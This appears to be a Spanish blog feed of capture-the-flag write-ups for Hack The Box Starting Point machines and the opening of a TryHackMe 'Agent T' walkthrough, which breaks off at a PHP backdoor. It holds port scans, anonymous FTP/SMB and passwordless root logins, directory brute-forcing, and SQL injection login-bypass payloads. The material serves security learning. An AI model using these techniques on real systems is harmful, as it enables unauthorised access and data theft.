feroxbuster (personal y profesionalmente creo que esta herramienta es bestial), pero os dejo los comandos de gobuster y ffuf para los que quieran probar otras alternativas.Atentos a las tags del box vamos a aprovechar el escaneo para pedirle a nuestras tools que busquen ficheros .php.Lo prometido sobre gobuster y ffuf.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ gobuster dir -u http://10.129.58.242 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x .phpSignificado de las flags: dir : Uses directory/file enumeration mode. -u : The target URL. -w : Path to the wordlist. -x : File extension(s) to search for.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ ffuf -u http://10.129.58.242/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -c -t 100 -e .php -o ffuf_output -of mdSignificado de las flags: -u : la URL que queremos escanear. -w : la ubicación del diccionario. -c : para colorear la salida. -t : nro de hilos concurrentes (por defecto son 40). -e : listado de extensiones que queremos rasrear, separadas por comas en caso de ser más de una. -o : nombre del fichero donde almacenaremos la salida. -of : formato del fichero de salida, md en nuestro caso.Vamos con feroxbuster. En aras de la sencillez, el volcado que pego a continuación esta editado para resaltar la información más relevante.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ feroxbuster -u http://10.129.58.242/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -e -t 100 -x php -o feroxbuster_output ___ ___ __ __ __ __ __ ___|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___by Ben \"epi\" Risher 🤓 ver: 2.7.0───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.129.58.242/ 🚀 Threads │ 100 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.7.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔎 Extract Links │ true 💾 Output File │ feroxbuster_output 💲 Extensions │ [php] 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 4 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™──────────────────────────────────────────────────[...]200 GET 999l 3031w 58565c http://10.129.58.242/index.html[...]200 GET 39l 115w 1577c http://10.129.58.242/login.php302 GET 0l 0w 0c http://10.129.58.242/logout.php =&gt; login.php200 GET 0l 0w 0c http://10.129.58.242/config.php301 GET 9l 28w 316c http://10.129.58.242/dashboard =&gt; http://10.129.58.242/dashboard/[...]302 GET 0l 0w 0c http://10.129.58.242/dashboard/index.php =&gt; /login.php[...][####################] - 2m 351170/351170 0s found:112 errors:27[####################] - 2m 175300/175300 1018/s http://10.129.58.242/[...][####################] - 2m 175300/175300 1080/s http://10.129.58.242/dashboard[...]Significado de las flags: -u : la URL que queremos escanear. -w : la ubicación de nuestro fichero de wordlist. -e : le pedimos que extraiga enlaces del cuerpo de la respuesta y realice nuevas peticiones en función de los resultados. -t : nro de hilos concurrentes. -x : la extensión de los ficheros que queremos buscar. -o : nombre del fichero donde almacenaremos la salida.Resumiendo:200 GET 39l 115w 1577c http://10.129.58.242/login.php302 GET 0l 0w 0c http://10.129.58.242/logout.php =&gt; login.php301 GET 9l 28w 316c http://10.129.58.242/dashboard =&gt; http://10.129.58.242/dashboard/302 GET 0l 0w 0c http://10.129.58.242/dashboard/index.php =&gt; /login.phpUna página login.php colgando del raiz y un directorio dashboard.Cargamos la URL http://10.129.58.242/login.php en el navegador.OK. Utilizamos la relación de credenciales que conseguimos a partir del los ficheros del FTP y probamos con cada una. (Spoiler: es la última)Accedemos al Dashboard y nos muestra la flag.Respuestas: Task 1: -sC Task 2: vsftpd 3.0.3 Task 3: 230 Task 4: get Task 5: admin Task 6: 2.4.41 Task 7: Wappalyzer Task 8: -x Task 9: login.php" }, { "title": "Hack The Box - Starting Point - Tier 1 - Sequel Writeup", "url": "/posts/htb-writeup-tier1-sequel/", "categories": "Hack The Box", "tags": "htb, writeups", "date": "2022-08-10 02:10:00 +0100", "snippet": "Este post forma parte de la serie Tier 1 del Starting Point de HTB que iniciamos aquí.SequelEl primer paso será iniciar la máquina (para lo que previamente tendremos que tener establecida nuestra conexión VPN)Las tags de este box no dan varias pistas de por donde van los tiros.Copiamos la IP del equipo remoto, en mi caso 10.129.217.57, y lanzamos un nmap.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ nmap -A 10.129.217.57 -oN nmap_outputStarting Nmap 7.92 ( https://nmap.org ) at 2022-08-09 20:16 CESTNmap scan report for 10.129.217.57Host is up (0.086s latency).Not shown: 999 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION3306/tcp open mysql?|_sslv2: ERROR: Script execution failed (use -d to debug)| mysql-info:| Protocol: 10| Version: 5.5.5-10.3.27-MariaDB-0+deb10u1| Thread ID: 84| Capabilities flags: 63486| Some Capabilities: SupportsCompression, ConnectWithDatabase, Support41Auth, FoundRows, InteractiveClient, Speaks41ProtocolOld, ODBCClient, SupportsTransactions, LongColumnFlag, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, IgnoreSigpipes, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments| Status: Autocommit| Salt: &gt;Rd~p4Pu!&gt;TnMrx&amp;PB;&gt;|_ Auth Plugin Name: mysql_native_password|_ssl-cert: ERROR: Script execution failed (use -d to debug)|_tls-alpn: ERROR: Script execution failed (use -d to debug)|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)|_ssl-date: ERROR: Script execution failed (use -d to debug)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 204.38 secondsSignificado de las flags: -A : escaneo completo (aka agresivo) que ejecuta OS detection, version detection, script scanning y traceroute todo del tirón. -oN : imprime la salida en un fichero de texto con el nombre nmap_outputOK. Tenemos un servicio mysql escuchando en el puerto 3306/tcp, concretamente una 5.5.5-10.3.27-MariaDB-0+deb10u1Iniciamos nuestro cliente mysql en local, con root como usuario y sin contraseña, y nos ponemos a trastear.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ mysql -h 10.129.217.57 -u rootWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 77Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.MariaDB [(none)]&gt; show databases;+--------------------+| Database |+--------------------+| htb || information_schema || mysql || performance_schema |+--------------------+4 rows in set (0.041 sec)MariaDB [(none)]&gt; use htb;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMariaDB [htb]&gt; show tables;+---------------+| Tables_in_htb |+---------------+| config || users |+---------------+2 rows in set (0.038 sec)MariaDB [htb]&gt; select * FROM users;+----+----------+------------------+| id | username | email |+----+----------+------------------+| 1 | admin | admin@sequel.htb || 2 | lara | lara@sequel.htb || 3 | sam | sam@sequel.htb || 4 | mary | mary@sequel.htb |+----+----------+------------------+4 rows in set (0.039 sec)MariaDB [htb]&gt; select * FROM config;+----+-----------------------+----------------------------------+| id | name | value |+----+-----------------------+----------------------------------+| 1 | timeout | 60s || 2 | security | default || 3 | auto_logon | false || 4 | max_size | 2M || 5 | flag | xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx || 6 | enable_uploads | false || 7 | authentication_method | radius |+----+-----------------------+----------------------------------+7 rows in set (0.038 sec)MariaDB [htb]&gt;Bingo !Respuestas: Task 1: Structured Query Language Task 2: 3306 Task 3: MariaDB Task 4: -u Task 5: root Task 6: * Task 7: ;" }, { "title": "Hack The Box - Starting Point - Tier 1 - Appointment Writeup", "url": "/posts/htb-writeup-tier1-appointment/", "categories": "Hack The Box", "tags": "htb, writeups", "date": "2022-08-10 02:00:00 +0100", "snippet": "Con estra entrada iniciamos una serie de posts en los que vamos a resolver 5 máquinas que conforman el Tier 1 del Starting Point de HTB.Las máquinas que veremos en esta serie son Appointment, Sequel, Crocodile, Responder y Three.Dentro música.Inicio Disclaimer: algunos de estos primeros pasos que menciono a continuación son opcionales y solo reflejan mi modo de trabajar. Cada uno debería aplicar el propio.Lo primero es conectarnos via VPN con HTB.┌──(ewan67㉿kali)-[~]└─$ sudo openvpn /home/ewan67/VPN_certs/HTB_lab_ewan67.ovpnAbrimos otro terminal en local, creamos la carpeta de trabajo, nos posicionamos en ella y creamos un fichero de notas en el que iremos apuntando información relevante a lo largo del proceso.┌──(ewan67㉿kali)-[~]└─$ cd Cybersecurity/HTB┌──(ewan67㉿kali)-[~/Cybersecurity/HTB]└─$ mkdir Tier1┌──(ewan67㉿kali)-[~/Cybersecurity/HTB]└─$ cd Tier1┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ touch notas┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ echo \"Notas Tier1\" &gt; notas┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ cat notasNotas Tier1AppointmentEl primer paso será iniciar la máquina correspondiente (para lo que previamente tendremos que tener establecida nuestra conexión VPN)Copiamos la IP del equipo remoto, en mi caso 10.129.217.36, y lanzamos un nmap.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]└─$ nmap -A 10.129.217.36 -oN nmap_outputStarting Nmap 7.92 ( https://nmap.org ) at 2022-08-09 19:57 CESTNmap scan report for 10.129.217.36Host is up (0.083s latency).Not shown: 999 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.38 ((Debian))|_http-title: Login|_http-server-header: Apache/2.4.38 (Debian)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 14.14 secondsSignificado de las flags: -A : escaneo completo (aka agresivo) que ejecuta OS detection, version detection, script scanning y traceroute todo del tirón. -oN : imprime la salida en un fichero de texto con el nombre nmap_outputTenemos el puerto 80/tcp con un Apache httpd 2.4.38 ((Debian)) escuchando. Abrimos el navegador y cargamos la IP.Formulario de Login al canto.Intentamos enviarlo vacío. Se queja. Metemos cualquier valor para Username y Password. Se envía pero no nos dice nada, no nos devuelve mensaje alguno.Siendo que la página es un simple formulario, pasamos a probar si la app que esta detrás es vulnerable a SQLi. Nota: Para los que estéis un poco verdes con este tema os recomiendo echar un ojo al tuto que nos ofrece Portswigger (los fabricantes de Burp Suite) aquí. Está en inglés pero vale la pena leerlo entero y darse de alta en el sitio (es gratis) para practicar con los laboratorios que nos proponen (que si bien estan bastante centrados en su aplicación, viendo el lado bueno, ésto nos permite aprender a manejar Burp Suite en el mismo viaje que profundizamos en SQLi).Probamos con los clásicos en el campo Username, metiendo cualquier cadena en Password para sortear el script que valida el envío. Por ejemplo:buenas' or 1=1;#hola' or 1=1;-- q talBingo !Respuestas: Task 1: Structured Query Language Task 2: SQL injection Task 3: Personally Identifiable Information Task 4: A03:2021-Injection Task 5: Apache httpd 2.4.38 ((Debian)) Task 6: 443 Task 7: brute-forcing Task 8: directory Task 9: 404 Task 10: dir Task 11: #" }, { "title": "Hack The Box - Starting Point - Tier 0 - Redeemer Writeup", "url": "/posts/htb-writeup-tier0-redeemer/", "categories": "Hack The Box", "tags": "htb, writeups", "date": "2022-08-09 02:30:00 +0100", "snippet": "Con este post finalizamos la serie Tier 0 del Starting Point de HTB que iniciamos aquí.RedeemerEl primer paso será iniciar la máquina (para lo que previamente tendremos que tener establecida nuestra conexión VPN)Copiamos la IP del equipo remoto, en mi caso 10.129.213.71, y lanzamos un nmap.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier0]└─$ nmap -A 10.129.213.71 -oN nmap_outputStarting Nmap 7.92 ( https://nmap.org ) at 2022-08-09 12:46 CESTNmap scan report for 10.129.213.71Host is up (0.12s latency).All 1000 scanned ports on 10.129.213.71 are in ignored states.Not shown: 1000 closed tcp ports (conn-refused)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 2.81 secondsSignificado de las flags: -A : escaneo completo (aka agresivo) que ejecuta OS detection, version detection, script scanning y traceroute todo del tirón. -oN : imprime la salida en un fichero de texto con el nombre nmap_outputUps !! … nobody listen :(Vamos a por todos los puertos utilizando la flag -p- , no solo los 1000 de -A .┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier0]└─$ nmap -A -p- 10.129.213.71 -oN nmap_outputStarting Nmap 7.92 ( https://nmap.org ) at 2022-08-09 12:48 CESTNmap scan report for 10.129.213.71Host is up (0.075s latency).Not shown: 65534 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION6379/tcp open redis Redis key-value store 5.0.7Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 29.85 secondsAhora si. Tenemos el puerto 6379/tcp con el servicio redis escuchando. Para los que no sepáis qué es Redis podéis informaros aquí.Utilizamos redis-cli para conectarnos con el comando -h  para indicarle el host.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier0]└─$ redis-cli -h 10.129.213.7110.129.213.71:6379&gt; Ejecutamos info[...]10.129.213.71:6379&gt; info# Serverredis_version:5.0.7redis_git_sha1:00000000redis_git_dirty:0redis_build_id:66bd629f924ac924redis_mode:standaloneos:Linux 5.4.0-77-generic x86_64[...]10.129.213.71:6379&gt;Lanzamos un select, le pedimos todas las keys y volcamos con get la que nos interesa. Para mas info sobre estos comandos: SELECT index KEYS pattern GET key[...]10.129.213.71:6379&gt; select 0OK10.129.213.71:6379&gt; keys *1) \"numb\"2) \"flag\"3) \"stor\"4) \"temp\"10.129.213.71:6379&gt; get flag\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"10.129.213.71:6379&gt;Con esto completamos el Tier 0 y se nos habilita el botón para pasar al siguiente nivel, el Tier 1.Enhorabuena a los que habéis llegado hasta aquí.Respuestas: Task 1: 6379 Task 2: redis Task 3: In-memory Database Task 4: redis-cli Task 5: -h Task 6: info Task 7: 5.0.7 Task 8: select Task 9: 4 Task 10: keys *" }, { "title": "Hack The Box - Starting Point - Tier 0 - Dancing Writeup", "url": "/posts/htb-writeup-tier0-dancing/", "categories": "Hack The Box", "tags": "htb, writeups", "date": "2022-08-09 02:20:00 +0100", "snippet": "Este post forma parte de la serie Tier 0 del Starting Point de HTB que iniciamos aquí.DancingEl primer paso será iniciar la máquina (para lo que previamente tendremos que tener establecida nuestra conexión VPN)Copiamos la IP del equipo remoto, en mi caso 10.129.186.250, y lanzamos un nmap.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier0]└─$ nmap -A 10.129.186.250 -oN nmap_outputStarting Nmap 7.92 ( https://nmap.org ) at 2022-08-09 12:34 CESTNmap scan report for 10.129.186.250Host is up (0.081s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds?Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time:| date: 2022-08-09T14:35:07|_ start_date: N/A| smb2-security-mode:| 3.1.1:|_ Message signing enabled but not required|_clock-skew: 3h59m59sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 20.54 secondsSignificado de las flags: -A : escaneo completo (aka agresivo) que ejecuta OS detection, version detection, script scanning y traceroute todo del tirón. -oN : imprime la salida en un fichero de texto con el nombre nmap_outputTenemos el puerto 445/tcp abierto (SMB) y con el servicio microsoft-ds escuchando.Utilizamos smbclient para conectarnos y sacar un listado de los recursos disponibles con el comando -L . Como no tenemos password, cuando nos la pide le damos al Enter.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier0]└─$ smbclient -L 10.129.186.250Password for [WORKGROUP\\ewan67]: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC WorkShares DiskReconnecting with SMB1 for workgroup listing.do_connect: Connection to 10.129.186.250 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)Unable to connect with SMB1 -- no workgroup availableProbamos a conectarnos a cada uno de los recursos que aparecen en el listado anterior a ver si alguno nos deja entrar sin contraseña. (Spoiler: el único que rula es el último).Una vez dentro, brujuleamos y nos descargamos lo que nos parezca interesante.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier0]└─$ smbclient \\\\\\\\10.129.186.250\\\\WorkSharesPassword for [WORKGROUP\\ewan67]:Try \"help\" to get a list of possible commands.smb: \\&gt; ls -laNT_STATUS_NO_SUCH_FILE listing \\-lasmb: \\&gt; ls . D 0 Mon Mar 29 10:22:01 2021 .. D 0 Mon Mar 29 10:22:01 2021 Amy.J D 0 Mon Mar 29 11:08:24 2021 James.P D 0 Thu Jun 3 10:38:03 2021 5114111 blocks of size 4096. 1732567 blocks availablesmb: \\&gt; cd Amy.Jsmb: \\Amy.J\\&gt; ls . D 0 Mon Mar 29 11:08:24 2021 .. D 0 Mon Mar 29 11:08:24 2021 worknotes.txt A 94 Fri Mar 26 12:00:37 2021 5114111 blocks of size 4096. 1732567 blocks availablesmb: \\Amy.J\\&gt; get worknotes.txtgetting file \\Amy.J\\worknotes.txt of size 94 as worknotes.txt (0.3 KiloBytes/sec) (average 0.2 KiloBytes/sec)smb: \\Amy.J\\&gt; cd ..smb: \\&gt; cd James.P\\smb: \\James.P\\&gt; ls . D 0 Thu Jun 3 10:38:03 2021 .. D 0 Thu Jun 3 10:38:03 2021 flag.txt A 32 Mon Mar 29 11:26:57 2021 5114111 blocks of size 4096. 1732440 blocks availablesmb: \\James.P\\&gt; get flag.txtgetting file \\James.P\\flag.txt of size 32 as flag.txt (0.1 KiloBytes/sec) (average 0.2 KiloBytes/sec)smb: \\James.P\\&gt;En nuestro directorio de trabajo tendremos descargado el fichero flag.txt con la bandera correspondiente.Respuestas: Task 1: Server Message Block Task 2: 445 Task 3: microsoft-ds Task 4: -L Task 5: WorkShares Task 6: get" }, { "title": "Hack The Box - Starting Point - Tier 0 - Fawn Writeup", "url": "/posts/htb-writeup-tier0-fawn/", "categories": "Hack The Box", "tags": "htb, writeups", "date": "2022-08-09 02:10:00 +0100", "snippet": "Este post forma parte de la serie Tier 0 del Starting Point de HTB que iniciamos aquí.FawnEl primer paso será iniciar la máquina (para lo que previamente tendremos que tener establecida nuestra conexión VPN)Copiamos la IP del equipo remoto, en mi caso 10.129.211.1, y lanzamos un nmap.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier0]└─$ nmap -A 10.129.211.1 -oN nmap_outputStarting Nmap 7.92 ( https://nmap.org ) at 2022-08-09 10:37 CESTNmap scan report for 10.129.211.1Host is up (0.047s latency).Not shown: 999 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.3| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_-rw-r--r-- 1 0 0 32 Jun 04 2021 flag.txt| ftp-syst:| STAT:| FTP server status:| Connected to ::ffff:10.10.xx.xx| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 2| vsFTPd 3.0.3 - secure, fast, stable|_End of statusService Info: OS: UnixService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 3.39 secondsSignificado de las flags: -A : escaneo completo (aka agresivo) que ejecuta OS detection, version detection, script scanning y traceroute todo del tirón. -oN : imprime la salida en un fichero de texto con el nombre nmap_outputEn vista de que tiene un servicio ftp corriendo en el puerto 21/tcp vamos a por él utilizando el usuario anonymous y sin password.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier0]└─$ ftp 10.129.211.1Connected to 10.129.211.1.220 (vsFTPd 3.0.3)Name (10.129.211.1:ewan67): anonymous331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; dir229 Entering Extended Passive Mode (|||5149|)150 Here comes the directory listing.-rw-r--r-- 1 0 0 32 Jun 04 2021 flag.txt226 Directory send OK.ftp&gt; get flag.txtlocal: flag.txt remote: flag.txt229 Entering Extended Passive Mode (|||47085|)150 Opening BINARY mode data connection for flag.txt (32 bytes).100% |*************************************************************************************************************************| 32 0.39 KiB/s 00:00 ETA226 Transfer complete.32 bytes received in 00:00 (0.21 KiB/s)ftp&gt;En nuestro directorio de trabajo tendremos descargado el fichero flag.txt con la bandera correspondiente.Respuestas: Task 1: File Transfer Protocol Task 2: 21 Task 3: SFTP Task 4: ping Task 5: vsftpd 3.0.3 Task 6: Unix Task 7: ftp -h Task 8: anonymous" }, { "title": "Hack The Box - Starting Point - Tier 0 - Meow Writeup", "url": "/posts/htb-writeup-tier0-meow/", "categories": "Hack The Box", "tags": "htb, writeups", "date": "2022-08-09 02:00:00 +0100", "snippet": "Con esta entrada iniciamos una serie de posts en los que vamos a resolver las 4 máquinas que conforman el Tier 0 del Starting Point de HTB, la puerta de entrada y requisito para poder avanzar dentro de esta plataforma.Las resolveremos en el orden en que aparecen listadas en HTB.Dentro música.Inicio Disclaimer: algunos de estos primeros pasos que menciono a continuación son opcionales y solo reflejan mi modo de trabajar. Cada uno debería aplicar el propio.Lo primero es conectarnos via VPN con HTB.┌──(ewan67㉿kali)-[~]└─$ sudo openvpn /home/ewan67/VPN_certs/HTB_lab_ewan67.ovpnAbrimos otro terminal en local, creamos la carpeta de trabajo, nos posicionamos en ella y creamos un fichero de notas en el que iremos apuntando información relevante a lo largo del proceso.┌──(ewan67㉿kali)-[~]└─$ cd Cybersecurity/HTB┌──(ewan67㉿kali)-[~/Cybersecurity/HTB]└─$ mkdir Tier0┌──(ewan67㉿kali)-[~/Cybersecurity/HTB]└─$ cd Tier0┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier0]└─$ touch notas┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier0]└─$ echo \"Notas Tier0\" &gt; notas┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier0]└─$ cat notasNotas Tier0MeowEl primer paso será iniciar la máquina correspondiente (para lo que previamente tendremos que tener establecida nuestra conexión VPN)Copiamos la IP del equipo remoto, en mi caso 10.129.70.144, y lanzamos un nmap.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier0]└─$ nmap -A 10.129.70.144 -oN nmap_outputStarting Nmap 7.92 ( https://nmap.org ) at 2022-08-09 10:27 CESTNmap scan report for 10.129.70.144Host is up (0.056s latency).Not shown: 999 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION23/tcp open telnet Linux telnetdService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 21.71 secondsSignificado de las flags: -A : escaneo completo (aka agresivo) que ejecuta OS detection, version detection, script scanning y traceroute todo del tirón. -oN : imprime la salida en un fichero de texto con el nombre nmap_outputnmap nos cuenta que el puerto 23/tcp esta abierto y con un servicio telnet escuchando. Intentamos conectarnos, utilizando root como user.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier0]└─$ telnet 10.129.70.144Trying 10.129.70.144...Connected to 10.129.70.144.Escape character is '^]'. █ █ ▐▌ ▄█▄ █ ▄▄▄▄ █▄▄█ ▀▀█ █▀▀ ▐▌▄▀ █ █▀█ █▀█ █▌▄█ ▄▀▀▄ ▀▄▀ █ █ █▄█ █▄▄ ▐█▀▄ █ █ █ █▄▄ █▌▄█ ▀▄▄▀ █▀█Meow login: rootWelcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue 09 Aug 2022 08:29:49 AM UTC System load: 0.0 Usage of /: 41.7% of 7.75GB Memory usage: 4% Swap usage: 0% Processes: 137 Users logged in: 0 IPv4 address for eth0: 10.129.70.144 IPv6 address for eth0: dead:beef::250:56ff:fe96:156d * Super-optimized for small spaces - read how we shrank the memory footprint of MicroK8s to make it the smallest full K8s around. https://ubuntu.com/blog/microk8s-memory-optimisation75 updates can be applied immediately.31 of these updates are standard security updates.To see these additional updates run: apt list --upgradableThe list of available updates is more than a week old.To check for new updates run: sudo apt updateLast login: Mon Sep 6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0root@Meow:~# Bien. Hacemos un ls -la, vemos que hay un fichero flag.txt, y lo abrimos para hacernos con la primera bandera.root@Meow:~# ls -latotal 36drwx------ 5 root root 4096 Jun 18 2021 .drwxr-xr-x 20 root root 4096 Jul 7 2021 ..lrwxrwxrwx 1 root root 9 Jun 4 2021 .bash_history -&gt; /dev/null-rw-r--r-- 1 root root 3132 Oct 6 2020 .bashrcdrwx------ 2 root root 4096 Apr 21 2021 .cache-rw-r--r-- 1 root root 33 Jun 17 2021 flag.txtdrwxr-xr-x 3 root root 4096 Apr 21 2021 .local-rw-r--r-- 1 root root 161 Dec 5 2019 .profile-rw-r--r-- 1 root root 75 Mar 26 2021 .selected_editordrwxr-xr-x 3 root root 4096 Apr 21 2021 snaproot@Meow:~# cat flag.txtxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxroot@Meow:~#Respuestas de este primer desafío: Task 1: Virtual Machine Task 2: terminal Task 3: openvpn Task 4: tun Task 5: ping Task 6: nmap Task 7: telnet Task 8: root" }, { "title": "Try Hack Me - Agent T - Writeup", "url": "/posts/thm-writeup-agentt/", "categories": "Try Hack Me", "tags": "thm, writeups", "date": "2022-08-08 02:30:00 +0100", "snippet": "En esta guía vamos a trabajar con la máquina Agent T disponible en THM, un CTF de dificultad baja creado por los usuarios ben, JohnHammond, cmnatic, blacknote y timtaylor.Dentro música.Inicio Disclaimer: algunos de estos primeros pasos que menciono a continuación son opcionales y solo reflejan mi modo de trabajar. Cada uno debería aplicar el propio.Lo primero es conectar nuestra máquina local con THM via VPN para poder atacar desde nuestro equipo a la máquina del room.┌──(ewan67㉿kali)-[~]└─$ sudo openvpn /home/ewan67/VPN_certs/THM_ewan67.ovpnIniciamos la máquina remota dando al botón  Start MachineAbrimos otro terminal en local, creamos la carpeta de trabajo, nos posicionamos en ella y creamos un fichero de notas en el que iremos apuntando información relevante a lo largo del proceso. En mi caso:┌──(ewan67㉿kali)-[~]└─$ cd Cybersecurity/THM┌──(ewan67㉿kali)-[~/Cybersecurity/THM]└─$ mkdir AgentT┌──(ewan67㉿kali)-[~/Cybersecurity/THM]└─$ cd AgentT┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/AgentT]└─$ touch notas┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/AgentT]└─$ echo \"Notas AgentT\" &gt; notas┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/AgentT]└─$ cat notasNotas AgentTCon la conexión VPN establecida y la máquina remota iniciada, copiamos las IPs que aparecen en la página de THM correspondientes a nuestro equipo y al server remoto. Esto lo hago por costumbre para no tener que estar escribiéndolas cada vez que necesite utilizarlas en algun comando. En mi caso:┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/AgentT]└─$ LIP=10.18.xx.xx &lt;- la IP de mi equipo via OpenVPN┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/AgentT]└─$ RIP=10.10.105.111 &lt;- la IP de la máquina remota Nota: Como es habitual, esperamos unos minutillos a que el servidor remoto se inicie y arranque todos los servicios antes de empezar a darle cariño.Reconocimiento &amp; EnumeraciónEl hint del room nos sugiere que miremos con atención las cabeceras HTTP que nos devuelve el servidor.Oído cocina. La cosa apunta a que hay algún tipo de servicio escuchando HTTP. Lanzamos un nmap para que nos lo confirme, nos diga puerto, etc.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/AgentT]└─$ nmap -A $RIP -oN nmap_outputStarting Nmap 7.92 ( https://nmap.org ) at 2022-08-08 13:23 CESTNmap scan report for 10.10.105.111Host is up (0.035s latency).Not shown: 999 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION80/tcp open http PHP cli server 5.5 or later (PHP 8.1.0-dev)|_http-title: Admin DashboardService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 12.48 secondsSignificado de las flags: -A : escaneo completo (aka agresivo) que ejecuta OS detection, version detection, script scanning y traceroute todo del tirón. -oN : imprime la salida en un fichero de texto con el nombre nmap_outputQué tenemos aquí ? el puerto 80/tcp esta abierto y hay un PHP cli server 5.5 or later (PHP 8.1.0-dev) escuchando en él.Cargamos la IP en un navegador.Toca trastear con el Dashboard, de manera manual y valiéndonos de las herramientas habituales para esta tarea (feroxbuster, nikto, etc).En este caso, atendiendo al hint que nos dan los autores y la info que nos ha devuelto nmap vamos a tirar por otros rumbos, concretamente: cabeceras HTTP.Análisis de vulnerabilidades.Repasemos la salida del nmap:[...]PORT STATE SERVICE VERSION80/tcp open http PHP cli server 5.5 or later (PHP 8.1.0-dev)[...]PHP 8.1.0-dev ? … qué es esto ? Tiramos de Google. Alegría en los resultados de búsqueda. Nos fijamos especialmente en éste.ExplotaciónLa página de exploit-db nos cuenta que una versión temprana de PHP, la versión PHP 8.1.0-dev, fue lanzada con una puerta 